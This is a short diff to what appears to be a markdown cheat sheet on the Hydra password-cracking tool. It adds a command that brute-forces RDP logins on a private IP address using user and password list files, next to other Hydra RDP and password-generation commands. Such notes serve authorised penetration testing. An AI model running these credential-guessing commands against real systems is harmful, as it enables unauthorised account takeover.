@@ -33,8 +33,10 @@ hydra -l wenber -V -x 3:3:1 rdp://127.0.0.1:3389
 ### -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-
 
 # 3389 rdp
+hydra -L user.txt -P pwd.txt 172.22.9.26 rdp -vV -e ns
 hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
 hydra rdp://192.168.1.1:3389 -l admin -p 123456 -V -F
+
 ```
 
 | param   | Description                                                  |
